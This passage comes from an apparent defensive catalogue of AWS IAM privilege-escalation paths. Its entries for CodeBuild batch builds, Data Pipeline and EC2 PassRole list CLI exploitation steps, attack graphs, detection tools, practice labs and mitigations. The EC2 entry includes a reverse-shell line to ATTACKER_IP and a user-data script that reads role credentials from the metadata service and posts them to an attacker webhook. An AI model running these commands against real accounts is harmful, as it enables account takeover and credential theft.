        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - CodeBuild PassRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      },
      {
        "title": "AWS CodeBuild API Reference - CreateProject",
        "url": "https://docs.aws.amazon.com/codebuild/latest/APIReference/API_CreateProject.html"
      },
      {
        "title": "AWS CodeBuild - Batch Builds",
        "url": "https://docs.aws.amazon.com/codebuild/latest/userguide/batch-build.html"
      }
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/codebuild_edges.py#L231"
    },
    "relatedPaths": [
      "codebuild-001",
      "codebuild-003",
      "ec2-001",
      "lambda-001",
      "cloudformation-001"
    ],
    "toolSupport": {
      "pmapper": false,
      "iamVulnerable": true,
      "pacu": false,
      "prowler": false
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+codebuild-createproject+codebuild-startbuildbatch",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "CodeBuild-CreateProjectPassRole",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section and must trust codebuild.amazonaws.com"
        },
        {
          "permission": "codebuild:CreateProject",
          "resourceConstraints": "Must have permission to create CodeBuild projects"
        },
        {
          "permission": "codebuild:StartBuildBatch",
          "resourceConstraints": "Must have permission to start build batches on the created project"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles that trust CodeBuild to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        },
        {
          "permission": "codebuild:BatchGetBuildBatches",
          "resourceConstraints": "Helpful for monitoring build batch execution status and verifying successful exploitation"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole`, `codebuild:CreateProject`, and `codebuild:StartBuildBatch` permissions. This principal will create a CodeBuild project configured for batch builds with a privileged role attached and start a build batch to execute code with elevated privileges.\n"
        },
        {
          "id": "codebuild_project",
          "label": "New CodeBuild Project (Batch Build)",
          "type": "resource",
          "description": "The newly created CodeBuild project configured for batch builds with a malicious buildspec. The project is created with `codebuild:CreateProject` and configured to use a privileged IAM role via `iam:PassRole`. The batch buildspec contains commands that will execute when the build batch starts, designed to grant the starting principal administrative access or perform privileged actions. Batch builds allow for more complex build orchestration but provide the same privilege escalation capability as standard builds.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the codebuild Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the CodeBuild project during creation. This role must trust codebuild.amazonaws.com as a principal in its trust policy. When the build batch executes, the CodeBuild environment automatically assumes this role and all buildspec commands run with this role's permissions.\n"
        },
        {
          "id": "execute_buildspec",
          "label": "Execute batch buildspec commands",
          "type": "action",
          "color": "#99ccff",
          "description": "When the build batch starts, the CodeBuild environment assumes the target role and executes the batch buildspec commands with the role's permissions. The buildspec can perform various privileged actions such as attaching AdministratorAccess to the starting principal, creating new access keys, modifying IAM policies, or accessing sensitive data.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent) or permissions to modify IAM policies (like `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:CreateAccessKey`), the buildspec successfully elevates the starting principal to administrator. The starting principal now has full administrative access to the AWS account.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin or IAM write permissions, the buildspec can perform some privileged actions. This could include access to sensitive data (S3, RDS, DynamoDB) or the ability to pursue additional escalation paths. The level of additional access depends on the specific permissions of the target role.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or permissions limited to logging/metrics, the buildspec execution may not provide meaningful privilege escalation. However, even limited access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "codebuild_project",
          "label": "iam:PassRole + codebuild:CreateProject",
          "description": "The attacker creates a new CodeBuild project configured for batch builds and passes a privileged role to it. The project is created with a malicious inline batch buildspec that will execute commands to escalate privileges.\n\nCommand:\n```bash\naws codebuild create-project \\\n  --name privesc-batch-project \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nbatch:\\n  fast-fail: false\\n  build-list:\\n    - identifier: privesc_build\\n      buildspec: |\\n        version: 0.2\\n        phases:\\n          build:\\n            commands:\\n              - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --build-batch-config serviceRole=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n```\n\nThe batch buildspec contains commands to attach AdministratorAccess to the starting principal or perform other privileged actions.\n"
        },
        {
          "from": "codebuild_project",
          "to": "target_role",
          "label": "Project assumes role",
          "description": "When the CodeBuild build batch is started, the CodeBuild service automatically assumes the target role on behalf of the build environment. All buildspec commands then execute with the permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "execute_buildspec",
          "label": "codebuild:StartBuildBatch",
          "description": "The attacker starts the build batch, which triggers execution of the batch buildspec commands with the target role's permissions. The build environment has full AWS SDK access and can make any API calls allowed by the role.\n\nCommand:\n```bash\naws codebuild start-build-batch --project-name privesc-batch-project\n```\n\nThe buildspec commands execute automatically when the build batch starts. Monitor with `aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID` to track execution.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "admin_outcome",
          "label": "If role has admin or IAM write permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or permissions to modify IAM (like `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AddUserToGroup`, `iam:CreateAccessKey`), the buildspec successfully elevates the starting principal to administrator. The starting principal gains full control over the AWS account.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "partial_outcome",
          "label": "If role has some elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated permissions but not full admin or IAM write access, the buildspec can perform some privileged actions. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables) or permissions that enable additional privilege escalation techniques through multi-hop attacks.\n"
        },
        {
          "from": "execute_buildspec",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions (like logs:CreateLogGroup, logs:PutLogEvents), the privilege escalation may not yield meaningful additional access. However, even limited access could be useful for reconnaissance or understanding the environment's configuration.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-30T01:31:23Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/codebuild/codebuild-004.yaml"
  },
  {
    "id": "datapipeline-001",
    "name": "iam:PassRole + datapipeline:CreatePipeline + datapipeline:PutPipelineDefinition + datapipeline:ActivatePipeline",
    "category": "service-passrole",
    "services": [
      "iam",
      "datapipeline"
    ],
    "description": "A principal with `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, and `datapipeline:ActivatePipeline` can create a new Data Pipeline that executes arbitrary code with the permissions of a passed IAM role. Data Pipeline can run shell commands on EC2 instances or EMR clusters, allowing privilege escalation. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts datapipeline.amazonaws.com or elasticmapreduce.amazonaws.com",
        "The role must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A role must exist that trusts datapipeline.amazonaws.com or elasticmapreduce.amazonaws.com"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws datapipeline create-pipeline --name privesc-pipeline --unique-id privesc-$(date +%s)\n",
          "description": "Create a new Data Pipeline"
        },
        {
          "step": 2,
          "command": "aws datapipeline put-pipeline-definition --pipeline-id PIPELINE_ID \\\n  --pipeline-definition file://malicious-pipeline.json\n",
          "description": "Define a pipeline that runs arbitrary shell commands with the privileged role"
        },
        {
          "step": 3,
          "command": "aws datapipeline activate-pipeline --pipeline-id PIPELINE_ID",
          "description": "Activate the pipeline to execute the malicious code"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificDataPipelineRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": [\"datapipeline.amazonaws.com\", \"elasticmapreduce.amazonaws.com\"]\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict Data Pipeline permissions to specific users\n- Monitor CloudTrail for Data Pipeline creation and activation\n- Require pipeline definitions to be stored in approved repositories\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - DataPipeline PassRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "lambda-001"
    ],
    "learningEnvironments": {
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "DataPipeline-PassExistingRoleToNewDataPipeline",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "datapipeline:CreatePipeline",
          "resourceConstraints": "Must have permission to create Data Pipeline pipelines"
        },
        {
          "permission": "datapipeline:PutPipelineDefinition",
          "resourceConstraints": "Must have permission to define pipeline activities"
        },
        {
          "permission": "datapipeline:ActivatePipeline",
          "resourceConstraints": "Must have permission to activate pipelines"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "detectionTools": {
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L553",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L61"
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, and `datapipeline:ActivatePipeline` permissions. This principal will create a Data Pipeline with a privileged role attached and activate it to execute arbitrary code with elevated privileges.\n"
        },
        {
          "id": "data_pipeline",
          "label": "New Data Pipeline",
          "type": "resource",
          "description": "The newly created Data Pipeline with a malicious pipeline definition. Data Pipeline can execute shell commands on EC2 instances or EMR clusters as part of pipeline activities. The pipeline is configured to run arbitrary commands with the permissions of the passed IAM role.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the datapipeline or elasticmapreduce Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Data Pipeline during creation. This role must trust datapipeline.amazonaws.com or elasticmapreduce.amazonaws.com as a principal in its trust policy. When the pipeline executes, shell commands run with this role's permissions on the underlying compute resources (EC2 or EMR).\n"
        },
        {
          "id": "exfiltrate",
          "label": "Execute shell commands",
          "type": "action",
          "color": "#99ccff",
          "description": "The Data Pipeline executes with the target role's permissions. The pipeline definition includes shell commands that can retrieve temporary credentials from the instance metadata service, perform privileged API calls, or exfiltrate data. Common actions include creating access keys for the starting principal, attaching admin policies, or sending credentials to an attacker-controlled server.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by using the credentials or executing privileged commands through the Data Pipeline.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB) or permissions that enable additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions, the privilege escalation may not provide meaningful additional access to the attacker. The Data Pipeline can still execute but with limited capabilities.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "data_pipeline",
          "label": "iam:PassRole + datapipeline:CreatePipeline + datapipeline:PutPipelineDefinition",
          "description": "The attacker creates a new Data Pipeline and passes a privileged role to it. The pipeline definition includes malicious shell commands that will execute when the pipeline is activated.\n\nCommands:\n```bash\naws datapipeline create-pipeline \\\n  --name privesc-pipeline \\\n  --unique-id privesc-$(date +%s)\n```\n\nThen define the pipeline with a malicious configuration:\n```bash\naws datapipeline put-pipeline-definition \\\n  --pipeline-id PIPELINE_ID \\\n  --pipeline-definition file://malicious-pipeline.json\n```\n\nThe malicious-pipeline.json contains ShellCommandActivity objects with commands to exfiltrate credentials or perform privileged actions.\n"
        },
        {
          "from": "data_pipeline",
          "to": "target_role",
          "label": "Pipeline assumes role",
          "description": "When the Data Pipeline is activated, it launches EC2 instances or EMR clusters that automatically assume the target role. The shell commands defined in the pipeline execute with the permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "exfiltrate",
          "label": "datapipeline:ActivatePipeline",
          "description": "The attacker activates the Data Pipeline, which executes the malicious shell commands with the target role's permissions. The commands can retrieve credentials from the instance metadata service or directly perform privileged API calls.\n\nCommand:\n```bash\naws datapipeline activate-pipeline \\\n  --pipeline-id PIPELINE_ID\n```\n\nThe pipeline executes on the underlying compute resources (EC2 or EMR) with the target role's credentials available via the instance metadata service.\n"
        },
        {
          "from": "exfiltrate",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. The shell commands can create access keys, attach admin policies, or exfiltrate credentials for direct use.\n"
        },
        {
          "from": "exfiltrate",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables) or permissions that enable additional privilege escalation techniques.\n"
        },
        {
          "from": "exfiltrate",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. However, even limited access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/datapipeline/datapipeline-001.yaml"
  },
  {
    "id": "ec2-001",
    "name": "iam:PassRole + ec2:RunInstances",
    "category": "service-passrole",
    "services": [
      "iam",
      "ec2"
    ],
    "description": "A principal with `iam:PassRole` and `ec2:RunInstances` permissions can launch a new EC2 instance and attach an existing IAM Role to it. By accessing this new instance (e.g., via User Data or SSM), the attacker can obtain the credentials of the passed role. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts ec2.amazonaws.com to assume it",
        "The role must have an instance profile associated with it",
        "The role must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A role must exist that trusts ec2.amazonaws.com to assume it",
        "The role must have an instance profile associated with it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Arn=\"arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE\" --user-data file://exploit.sh",
          "description": "Launch EC2 instance with privileged role and user data script to exfiltrate credentials"
        },
        {
          "step": 2,
          "command": "# User data script executes on boot and sends credentials to attacker-controlled server",
          "description": "Retrieve the temporary credentials from the attacker's server"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run ec2__startup_shell_script --instance-profile PRIVILEGED_ROLE --script exploit.sh",
          "description": "Use Pacu to launch EC2 instance with the target role and execute a shell script on startup"
        }
      ]
    },
    "recommendation": "- Tightly control the `iam:PassRole` permission using the principle of least privilege.\n- Use IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"`iam:PassRole`\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"`iam:PassedToService`\": \"ec2.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for suspicious PassRole + RunInstances patterns, especially:\n  - PassRole events followed immediately by RunInstances\n  - Roles being passed to EC2 that haven't been used before\n  - EC2 instances launched with privileged roles by unusual principals\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - CreateEC2WithExistingIP",
        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc3-CreateEC2WithExistingIP.tf"
      }
    ],
    "relatedPaths": [
      "lambda-001",
      "cloudformation-001"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ec2_edges.py#L73-L127",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L131-L132",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L733-L738",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L26-L30"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ec2-runinstances",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "EC2-CreateInstanceWithExistingProfile",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "iam_privesc_by_attachment",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS privilege escalation through instance profile manipulation"
      },
      "pwnedlabs": {
        "type": "closed-source",
        "description": "Hosted cloud security labs with AWS privilege escalation scenarios",
        "scenario": "https://labs.pwnedlabs.io/command-injection-to-ec2-user-data-privilege-escalation",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PassRole and ec2:RunInstances permissions. Can be an IAM user or role.\n"
        },
        {
          "id": "ec2_instance",
          "label": "New EC2 Instance",
          "type": "resource",
          "description": "New EC2 instance launched with a privileged IAM instance profile. The instance automatically assumes the attached role. The attacker can access this instance through multiple methods including User Data scripts, SSM Session Manager, or SSH.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the EC2 Service",
          "type": "resource",
          "description": "IAM role attached to the EC2 instance via instance profile. The role must trust ec2.amazonaws.com and have an instance profile associated with it. Credentials are available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
        },
        {
          "id": "method_userdata_direct",
          "label": "Method 1: User Data Script (Direct Elevation)",
          "type": "action",
          "color": "#99ccff",
          "description": "Configure a User Data script that executes when the instance boots and directly elevates the starting principal by modifying IAM permissions. The script runs with the target role's credentials and can perform privileged IAM actions such as:\n- Attaching AdministratorAccess policy to the starting principal (iam:AttachUserPolicy)\n- Creating new access keys for privileged users (iam:CreateAccessKey)\n- Adding the starting principal to an admin IAM group (iam:AddUserToGroup)\n- Modifying inline policies to grant elevated permissions (iam:PutUserPolicy)\n\nExample User Data script that directly elevates starting principal:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name starting-user \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThis approach is the most straightforward - the User Data script directly modifies IAM to grant the starting principal elevated permissions using the target role's credentials.\n"
        },
        {
          "id": "method_reverse_shell",
          "label": "Method 2: User Data Script (Reverse Shell)",
          "type": "action",
          "color": "#99ccff",
          "description": "Configure a User Data script that establishes a reverse shell connection back to an attacker-controlled listener. The reverse shell provides interactive access to the EC2 instance, allowing the attacker to manually retrieve the target role's temporary credentials from the instance metadata service.\n\nExample User Data script that establishes reverse shell:\n```bash\n#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n```\n\nOnce the reverse shell is established, the attacker can:\n1. Query the instance metadata service: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`\n2. Extract temporary credentials (AccessKeyId, SecretAccessKey, SessionToken)\n3. Configure these credentials locally: `aws configure set` or environment variables\n4. Use the credentials to perform actions as the target role\n\nThe reverse shell approach requires the attacker to maintain a listener (e.g., `nc -lvnp 4444`) but provides interactive access and flexibility for manual reconnaissance and exploitation.\n"
        },
        {
          "id": "method_credential_exfil",
          "label": "Method 3: User Data Script (Credential Exfiltration)",
          "type": "action",
          "color": "#99ccff",
          "description": "Configure a User Data script that queries the instance metadata service for the target role's temporary credentials and exfiltrates them to an attacker-controlled webhook or remote listener. Unlike the reverse shell approach (which provides interactive access), this method is fire-and-forget - the script automatically retrieves and sends credentials without requiring ongoing attacker interaction.\n\nExample User Data script that exfiltrates credentials:\n```bash\n#!/bin/bash\nROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)\nCREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)\ncurl -X POST -d \"$CREDS\" https://attacker-webhook.com/collect\n```\n\nThe script automatically:\n1. Queries the metadata service to discover the attached role name\n2. Retrieves the full credential set (AccessKeyId, SecretAccessKey, SessionToken)\n3. Sends the credentials to an attacker-controlled endpoint (webhook, HTTP server, etc.)\n\nThe attacker receives the credentials remotely and can then configure them locally to authenticate as the target role. This approach is stealthier than reverse shell (no inbound connections to EC2 instance) and doesn't require maintaining a listener throughout the attack.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions (but not full admin). Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "ec2_instance",
          "label": "iam:PassRole + ec2:RunInstances",
          "description": "Launch a new EC2 instance and pass the target role to it via the --iam-instance-profile parameter. Include a User Data script that will execute on instance boot to exfiltrate credentials or establish access.\n\nCommand:\n```bash\naws ec2 run-instances \\\n  --image-id ami-12345678 \\\n  --instance-type t2.micro \\\n  --iam-instance-profile Arn=\"arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE\" \\\n  --user-data file://exploit.sh\n```\n"
        },
        {
          "from": "ec2_instance",
          "to": "target_role",
          "label": "Instance assumes role",
          "description": "The EC2 instance automatically assumes the attached IAM role. Credentials become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
        },
        {
          "from": "target_role",
          "to": "method_userdata_direct",
          "label": "Option A",
          "description": "Configure the EC2 instance with a User Data script that directly modifies IAM to elevate the starting principal's permissions.\n"
        },
        {
          "from": "target_role",
          "to": "method_reverse_shell",
          "label": "Option B",
          "description": "Configure the EC2 instance with a User Data script that establishes a reverse shell connection back to an attacker-controlled listener.\n"
        },
        {
          "from": "target_role",
          "to": "method_credential_exfil",
          "label": "Option C",
          "description": "Configure the EC2 instance with a User Data script that exfiltrates the target role's temporary credentials to an attacker-controlled webhook or remote listener.\n"
        },
        {
          "from": "method_userdata_direct",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "A1",
          "condition": "admin",
          "description": "The User Data script executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access (e.g., via iam:AttachUserPolicy).\n"
        },
        {
          "from": "method_userdata_direct",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "A2",
          "condition": "some_permissions",
          "description": "The User Data script executes with elevated permissions and can modify IAM to grant the starting principal additional access within those permissions.\n"
        },
        {
          "from": "method_userdata_direct",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "A3",
          "condition": "no_permissions",
          "description": "The User Data script has minimal permissions and cannot effectively elevate the starting principal's privileges.\n"
        },
        {
          "from": "method_reverse_shell",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "B1",
          "condition": "admin",
          "description": "The reverse shell provides access to credentials with AdministratorAccess permissions. The attacker can exfiltrate these credentials and use them to gain full administrative access to the AWS account.\n"
        },
        {
          "from": "method_reverse_shell",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "B2",
          "condition": "some_permissions",
          "description": "The reverse shell provides access to credentials with elevated permissions. The attacker can exfiltrate these credentials for data access or additional privilege escalation attempts.\n"
        },
        {
          "from": "method_reverse_shell",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "B3",
          "condition": "no_permissions",
          "description": "The reverse shell provides access to credentials with minimal permissions, offering limited value for privilege escalation.\n"
        },
        {
          "from": "method_credential_exfil",
          "to": "admin",
          "label": "If target role has admin permissions",
          "branch": "C1",
          "condition": "admin",
          "description": "The User Data script successfully exfiltrates credentials with AdministratorAccess permissions. The attacker configures these credentials locally and gains full administrative access.\n"
        },
        {
          "from": "method_credential_exfil",
          "to": "some_perms",
          "label": "If target role has some elevated permissions",
          "branch": "C2",
          "condition": "some_permissions",
          "description": "The User Data script exfiltrates credentials with elevated permissions that can be used for data exfiltration or further privilege escalation.\n"
        },
        {
          "from": "method_credential_exfil",
          "to": "no_access",
          "label": "If target role has minimal permissions",
          "branch": "C3",
          "condition": "no_permissions",
          "description": "The exfiltrated credentials have minimal permissions and provide limited value for privilege escalation.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "ec2:RunInstances",
          "resourceConstraints": "Must have permission to launch EC2 instances"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ec2/ec2-001.yaml"
  },
  {
    "id": "ec2-002",
    "name": "ec2:ModifyInstanceAttribute + ec2:StopInstances + ec2:StartInstances",
    "category": "access-resource",
    "services": [
      "ec2"
    ],
    "description": "An attacker with the permissions to modify an EC2 instance's attributes, stop it, and start it can gain full control over the instance. The `ec2:ModifyInstanceAttribute` permission can be used to change an instance's userData, which is a script that normally runs on the initial boot. However with a specially crafted payload, a modified userData script can be coerced to run on subsequent restarts. To modify the userData of a running instance, it must first be stopped. The attacker can inject a malicious script (e.g., for a reverse shell) into the userData, and then start the instance to trigger its execution. This provides the attacker with code execution on the machine, allowing them to steal the credentials of any attached IAM role.",
    "prerequisites": {
      "admin": [
        "EC2 instance must have an instance profile attached to an IAM role",
